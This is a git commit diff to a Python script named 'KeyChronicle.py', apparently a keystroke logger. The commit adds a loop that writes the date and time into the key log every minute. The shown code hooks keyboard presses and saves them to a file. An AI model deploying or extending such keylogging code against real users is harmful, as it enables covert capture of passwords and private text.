26ab9be05632f36e5695f3728ac987c0959bba37
SlahtalabMohsen <eslahtalab.mohsen@gmail.com>
2023-12-05 17:00:25 +0330

    Add function to log date and time every minute
    Create a function log_date_time to log the current date and time to the specified output file every minute. The function contains a loop that ensures continuous logging and uses Python's datetime and time modules for time tracking.

--- KeyChronicle.py
+++ KeyChronicle.py
@@ -13,5 +13,15 @@ def save_key(e):
 
 keyboard.on_press(save_key)
 
+# Create a function to log the date and time every one minute
+def log_date_time():
+    while True:
+        with open(output_file, 'a') as f:
+            f.write(f"\n Date/Time: {datetime.datetime.now()} \n")
+        time.sleep(60)  # sleep for 60 seconds (1 minute)
+
+# Start logging the date and time every one minute
+log_date_time();
+
 # Start the keyboard listener
 keyboard.wait()
